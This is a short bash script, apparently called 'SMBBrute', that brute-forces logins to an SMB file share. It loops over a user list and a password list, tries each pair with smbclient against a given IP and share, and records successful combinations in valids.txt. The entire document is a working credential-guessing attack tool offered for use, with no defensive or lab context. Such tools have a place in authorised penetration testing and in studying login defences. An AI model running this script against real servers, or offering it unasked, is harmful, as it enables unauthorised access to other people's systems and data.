#!/bin/bash

figlet SMBBrute

echo "Usage: script.sh <IP> <Share_Name> <User_list> <Pass_list>" 


RED='\033[0;31m'
GREEN='\033[0;32m'

while read p; do 
  while IFS= read -r line; do
    
    smbclient -U $line%$p \\\\$1\\$2 1> /tmp/file.txt 2> /tmp/file2.txt
    
    if grep -q help /tmp/file.txt; then
    	
    	echo -e "${GREEN}[+]Valid Combination Found - $line:$p"
    	#Throw valid one's into a file.
    	echo "$line:$p" >> valids.txt
    	
    else
    	echo -e "${RED}[-] Invalid!"
    fi 

  done < $3
done < $4

